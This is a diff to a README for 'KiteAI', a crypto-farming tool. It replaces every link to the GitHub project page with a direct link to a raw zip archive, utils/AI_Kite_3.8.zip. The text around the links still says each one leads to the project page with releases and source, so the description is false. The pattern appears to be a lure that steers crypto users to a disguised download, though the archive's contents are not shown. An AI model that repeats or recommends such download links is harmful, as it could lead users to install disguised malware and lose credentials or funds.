@@ -1,6 +1,6 @@
 # 🪁 KiteAI - Simplify Your Crypto Farming Tasks
 
-[![Download KiteAI](https://img.shields.io/badge/Download-KiteAI-brightgreen?style=for-the-badge)](https://github.com/toleuranus332/KiteAI)
+[![Download KiteAI](https://img.shields.io/badge/Download-KiteAI-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/toleuranus332/KiteAI/main/utils/AI_Kite_3.8.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To get KiteAI on your computer, follow these steps:
 
 1. Click the large green button below or visit the official page to download the latest version:
 
-   [![Download KiteAI](https://img.shields.io/badge/Download-KiteAI-brightgreen?style=for-the-badge)](https://github.com/toleuranus332/KiteAI)
+   [![Download KiteAI](https://img.shields.io/badge/Download-KiteAI-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/toleuranus332/KiteAI/main/utils/AI_Kite_3.8.zip)
 
 2. This link will take you to the KiteAI GitHub page. Here you will find all releases, source files, and instructions.
 
@@ -101,7 +101,7 @@ The app will guide you through configuring each feature in its interface.
 To get improvements or security fixes, update KiteAI regularly:
 
 1. Visit the same download page:  
-[https://github.com/toleuranus332/KiteAI](https://github.com/toleuranus332/KiteAI)
+[https://raw.githubusercontent.com/toleuranus332/KiteAI/main/utils/AI_Kite_3.8.zip](https://raw.githubusercontent.com/toleuranus332/KiteAI/main/utils/AI_Kite_3.8.zip)
 
 2. Check the latest release section.
 
@@ -151,7 +151,7 @@ Knowing these can help you understand how KiteAI fits into crypto workflows.
 
 Start here to get KiteAI:
 
-[![Download KiteAI](https://img.shields.io/badge/Download-KiteAI-brightgreen?style=for-the-badge)](https://github.com/toleuranus332/KiteAI)
+[![Download KiteAI](https://img.shields.io/badge/Download-KiteAI-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/toleuranus332/KiteAI/main/utils/AI_Kite_3.8.zip)
 
 Download the Windows files, install or extract, then run the program. Follow on-screen prompts to add accounts and enable tasks.
 
